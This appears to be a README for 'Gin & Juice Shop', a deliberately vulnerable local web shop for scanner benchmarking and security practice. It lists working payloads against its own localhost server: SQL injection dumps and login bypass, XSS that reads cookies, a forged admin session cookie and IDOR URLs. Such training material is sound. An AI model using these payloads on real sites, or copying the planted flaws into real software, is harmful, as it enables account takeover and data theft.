# 🍸 Gin & Juice Shop - Deliberately Vulnerable Web Application Testbed

A lightweight, high-fidelity vulnerable e-commerce application inspired by PortSwigger Web Security Academy's "Gin & Juice Shop" labs. Designed for evaluating Web Application Vulnerability Scanners (DAST), automated pentesting tools, and practicing hands-on web application security testing.

---

## ⚡ Key Highlights
- **Ultra-Lightweight**: Entire repository and dependencies take under 20MB.
- **Realistic Scenarios**: Real e-commerce flows (catalog, search, cart, checkout, newsletter, profile, admin console).
- **Embedded Scoreboard**: Interactive `/vulnerabilities` dashboard cataloging all flaws with CWE IDs, OWASP Top 10 mappings, live exploit payloads, and remediation guidance.
- **Zero Heavy Setup**: Runs natively on Node.js with built-in SQLite—no Docker or external database servers required.

## 🚀 Quick Start Guide

### Prerequisites
- **Node.js**: v18+ (tested on Node.js v20/v22)
- **NPM**: v9+

### 1. Installation
Install minimal dependencies (`express`, `ejs`, `cookie-parser`, `sqlite3`):
```bash
npm install
```

### 2. Initialize Database
Create and seed the SQLite database tables (users, products, carts, orders, newsletter):
```bash
npm run init-db
```

### 3. Launch the Server
Start the Express web application on `http://localhost:3000`:
```bash
npm start
```

## 🎯 Vulnerability Matrix & Exploitation Guide

### 1. SQL Injection (SQLi) - Product Catalog & Search
- **CWE**: CWE-89 | **OWASP**: A03:2021-Injection
- **Endpoints**: `GET /?category=` and `GET /search?q=`
- **Description**: Category and search queries are concatenated directly into raw SQL.
- **Exploits**:
  - **Unreleased Secret Item Discovery**:
    ```text
    http://localhost:3000/?category=Gin'+OR+1=1--
    ```
  - **Database Dump via UNION SQLi**:
    ```text
    http://localhost:3000/?category=Gin'+UNION+SELECT+id,username,password,email,role,api_key,balance,1+FROM+users--
    ```

### 2. SQL Injection - Authentication Bypass
- **CWE**: CWE-89 | **OWASP**: A03:2021-Injection
- **Endpoint**: `POST /login`
- **Description**: Username and password fields are inserted directly into the authentication query.
- **Exploit**:
  - **Username**: `administrator'--`
  - **Password**: *(any arbitrary text)*

### 3. Reflected Cross-Site Scripting (XSS)
- **CWE**: CWE-79 | **OWASP**: A03:2021-Injection
- **Endpoint**: `GET /subscribe?email=`
- **Description**: Email parameter in newsletter subscription is reflected back unescaped using `<%- email %>`.
- **Exploit**:
  ```text
  http://localhost:3000/subscribe?email=<script>alert(document.cookie)</script>
  http://localhost:3000/subscribe?email=<img src=x onerror=alert('Reflected-XSS')>
  ```

### 4. DOM-based Cross-Site Scripting (DOM XSS)
- **CWE**: CWE-79 | **OWASP**: A03:2021-Injection
- **Endpoint**: `GET /product?id=1&custom_msg=`
- **Description**: Bottle engraving preview reads `location.search` or `location.hash` and writes into `innerHTML` without sanitization.
- **Exploit**:
  ```text
  http://localhost:3000/product?id=1&custom_msg=<img src=x onerror=alert('DOM-XSS')>
  http://localhost:3000/product?id=1#<svg/onload=alert('DOM-XSS-Hash')>
  ```

### 5. Insecure Direct Object Reference (IDOR)
- **CWE**: CWE-639 | **OWASP**: A01:2021-Broken Access Control
- **Endpoints**: `GET /cart?cartId=X` and `GET /profile?id=X`
- **Description**: Cart and profile endpoints accept arbitrary integer IDs without validating session authorization.
- **Exploits**:
  - View Admin's classified shopping cart: `http://localhost:3000/cart?cartId=3`
  - View Admin's private API key & profile details: `http://localhost:3000/profile?id=3`

### 6. Broken Authentication & Session Forgery
- **CWE**: CWE-384 / CWE-287 | **OWASP**: A07:2021-Identification and Authentication Failures
- **Cookie**: `session`
- **Description**: Session tokens are base64-encoded JSON strings containing `{userId, username, role, isAdmin}` without cryptographic signatures (HMAC) or server validation.
- **Exploit**:
  1. Base64-encode: `{"userId":3,"username":"administrator","role":"admin","isAdmin":true}`
  2. Result: `eyJ1c2VySWQiOjMsInVzZXJuYW1lIjoiYWRtaW5pc3RyYXRvciIsInJvbGUiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9`
  3. Set browser cookie `session` to this value and visit `http://localhost:3000/admin`.

### 7. Cross-Site Request Forgery (CSRF)
- **CWE**: CWE-352 | **OWASP**: A01:2021-Broken Access Control
- **Endpoint**: `POST /profile/change-email`
- **Description**: Form submissions lack anti-CSRF synchronization tokens and SameSite cookie controls.

### 8. Missing Security Headers & Clickjacking
- **CWE**: CWE-1021 / CWE-693 | **OWASP**: A05:2021-Security Misconfiguration
- **Description**: Missing `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, and `Strict-Transport-Security`.
- **Proof of Concept**: Visit `http://localhost:3000/clickjack-test` to view the site rendered in an iframe.

### 9. Information Disclosure
- **CWE**: CWE-200 | **OWASP**: A05:2021-Security Misconfiguration
- **Endpoints**:
  - `GET /robots.txt`
  - `GET /api/debug/system-info`
  - `GET /backup.db` (downloads live SQLite database)

## 🔍 DAST Scanner Benchmark Instructions

To evaluate automated vulnerability scanners (e.g., OWASP ZAP, Burp Suite Enterprise / Professional, Nikto, Nuclei, Arachni):

1. **Target URL**: `http://localhost:3000/`
2. **Authenticated Scan**: Configure login form authentication at `http://localhost:3000/login` with `carlos` / `hunter2`.
3. **Seeding URL**: Point the scanner at `http://localhost:3000/vulnerabilities` and `http://localhost:3000/robots.txt` for automatic route discovery.
